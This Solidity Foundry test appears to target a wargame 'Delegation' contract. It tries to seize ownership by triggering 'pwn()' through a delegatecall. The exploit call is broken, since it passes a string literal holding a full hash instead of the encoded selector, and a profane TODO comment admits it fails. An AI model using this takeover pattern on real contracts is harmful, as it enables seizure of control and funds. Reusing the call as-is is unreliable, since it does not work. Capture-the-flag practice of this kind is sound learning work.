// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Delegation} from "../src/Counter.sol";
import {console} from "forge-std/Console.sol";

contract TestContract is Test {
    Delegation delegation;
    address testAccount;
    address anvilAccount = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function setUp() public {
        vm.prank(anvilAccount);
        delegation = new Delegation(anvilAccount);
        testAccount = makeAddr("testAccount");
    }

    function testasdfasdf() public {
        assertEq(delegation.owner(), anvilAccount);
        bytes memory calldataPwn = abi.encodeWithSignature("pwn()");
        //  console.logBytes(calldataPwn);
        vm.prank(testAccount);
        // TODO : why the fuck this delegate call is now failing
        (bool success,) = address(delegation).call("0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab");
        address owner = delegation.owner();
        assertEq(success, true);
        assertEq(owner, testAccount);
    }
}
